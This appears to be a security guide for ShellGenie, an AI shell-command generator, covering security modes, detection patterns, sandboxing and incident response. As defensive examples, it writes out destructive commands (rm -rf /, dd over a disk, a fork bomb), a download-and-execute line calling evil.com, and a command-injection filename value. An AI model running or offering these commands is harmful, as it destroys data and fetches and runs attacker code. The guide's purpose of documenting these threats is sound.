# Security Guide

## Overview

ShellGenie implements multiple layers of security to protect your system while providing AI-powered command generation. This document explains the security features and best practices.

## Security Levels

### Strict Mode
- **Use case**: Production environments, critical systems
- **Behavior**: Only whitelisted commands allowed
- **Risk**: Minimal - very restrictive
- **Example**:
  ```bash
  shellgenie run "list files" --security strict
  ```

### Moderate Mode (Default)
- **Use case**: Daily development work
- **Behavior**: Blocks dangerous commands, warns on suspicious ones
- **Risk**: Low - balanced security and usability
- **Example**:
  ```bash
  shellgenie run "find large files" --security moderate
  ```

### Permissive Mode
- **Use case**: Experienced users, testing
- **Behavior**: Warns but allows most commands
- **Risk**: Medium - requires user vigilance
- **Example**:
  ```bash
  shellgenie run "system maintenance" --security permissive
  ```

### Disabled Mode
- **Use case**: Controlled environments only
- **Behavior**: No security checks
- **Risk**: High - not recommended
- **Warning**: Only use in isolated environments!

## Threat Detection

### Critical Commands

ShellGenie blocks or warns about commands that could destroy your system:

- `rm -rf /` - Delete entire filesystem
- `dd if=/dev/zero of=/dev/sda` - Overwrite disk
- `mkfs.*` - Format filesystem
- `:(){ :|:& };:` - Fork bomb
- Network-based attacks

### Pattern-Based Detection

Regular expressions identify dangerous patterns:

```python
# Examples of detected patterns
r"rm\s+-rf\s+/"                    # Dangerous deletion
r"wget.*\|\s*(bash|sh)"            # Download and execute
r"chmod\s+-R\s+777\s+/"            # Dangerous permissions
```

### Risk Levels

Each command gets a risk assessment:

- **Low**: Safe commands (ls, cat, echo)
- **Medium**: Potentially risky (sudo, rm, chmod)
- **High**: Dangerous operations (rm -rf, kill -9)
- **Critical**: System-destroying commands

## Best Practices

### 1. Always Review Commands

Never blindly execute AI-generated commands:

```bash
# Good: Review first
shellgenie run "delete temp files"
# Review the command
# Press 'y' only if it looks correct

# Bad: Auto-execute everything
shellgenie run "cleanup system" --execute  # Dangerous!
```

### 2. Use Appropriate Security Levels

```bash
# For exploration
shellgenie interactive --security moderate

# For production
shellgenie run "deploy app" --security strict
```

### 3. Enable Logging

Keep audit trails:

```yaml
# config.yaml
app:
  log_level: INFO
  log_file: ~/.shellgenie/audit.log
```

### 4. Run in Docker

Isolate ShellGenie from your host system:

```bash
make docker-run
docker exec -it shellgenie-dev bash
```

### 5. Regular Updates

Keep ShellGenie and models updated:

```bash
git pull origin main
pip install -e ".[gpu]" --upgrade
ollama pull llama3.2
```

## Whitelisting and Blacklisting

### Custom Whitelist

Add trusted commands:

```yaml
# config.yaml
security:
  whitelist:
    - git
    - npm
    - docker
    - pytest
```

### Custom Blacklist

Block specific commands:

```yaml
# config.yaml
security:
  blacklist:
    - dangerous_script
    - untrusted_binary
```

## Sandboxing

### Environment Isolation

ShellGenie sanitizes the environment:

```python
safe_env = {
    "PATH": "/usr/local/bin:/usr/bin:/bin",
    "HOME": "/home/user",
    "USER": "user",
    # Secrets are NOT included
}
```

### Path Validation

Prevents access to sensitive locations:

- `/dev/*` - Device files
- `/proc/*` - Process information
- `/sys/*` - System files

### Timeout Protection

Commands are killed after timeout:

```yaml
app:
  timeout: 300  # 5 minutes max
```

## Docker Security

### GPU Passthrough

Safe GPU access:

```yaml
deploy:
  resources:
    reservations:
      devices:
        - driver: nvidia
          count: 1
          capabilities: [gpu]
```

### Resource Limits

Prevent resource exhaustion:

```yaml
mem_limit: 32g
memswap_limit: 32g
shm_size: 8g
```

### Network Isolation

Control network access:

```yaml
networks:
  - shellgenie-network
```

## Common Attack Vectors

### 1. Command Injection

**Attack**:
```bash
filename="'; rm -rf /"
```

**Protection**: Input sanitization and validation

### 2. Download and Execute

**Attack**:
```bash
wget http://evil.com/malware.sh | bash
```

**Protection**: Pattern detection and warnings

### 3. Privilege Escalation

**Attack**:
```bash
sudo su -
```

**Protection**: Security level enforcement

### 4. Fork Bombs

**Attack**:
```bash
:(){ :|:& };:
```

**Protection**: Critical command detection

## Incident Response

### If a Dangerous Command is Generated

1. **Don't execute it**
2. **Report the prompt** that caused it
3. **Check logs**: `~/.shellgenie/shellgenie.log`
4. **Adjust security level** if needed

### If a Command Causes Damage

1. **Stop execution**: Ctrl+C
2. **Check history**: `shellgenie history`
3. **Review logs**
4. **Restore from backup**
5. **Report the issue**

## Security Checklist

- [ ] Using appropriate security level
- [ ] Logging enabled and monitored
- [ ] Commands reviewed before execution
- [ ] Running in Docker for isolation
- [ ] Regular updates installed
- [ ] Whitelist/blacklist configured
- [ ] Backup strategy in place
- [ ] Team trained on security practices

## Limitations

### Known Limitations

1. **LLM Hallucinations**: Models can generate incorrect commands
2. **Context Misunderstanding**: May misinterpret complex requests
3. **Novel Attacks**: Cannot detect all possible attack vectors
4. **User Responsibility**: Final decision is always yours

### What ShellGenie Cannot Protect Against

- User deliberately executing dangerous commands
- Vulnerabilities in underlying system
- Compromised LLM models
- Social engineering attacks

## Reporting Security Issues

If you find a security vulnerability:

1. **Do NOT** open a public issue
2. **Email**: security@gryphgen.ai
3. **Include**:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

## Security Roadmap

- [ ] Sandboxing with cgroups/namespaces
- [ ] ML-based anomaly detection
- [ ] Integration with security tools (AppArmor, SELinux)
- [ ] Two-factor confirmation for high-risk commands
- [ ] Automated security audits
- [ ] Rate limiting and abuse prevention

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)

---

**Remember: Security is a shared responsibility. Stay vigilant!**
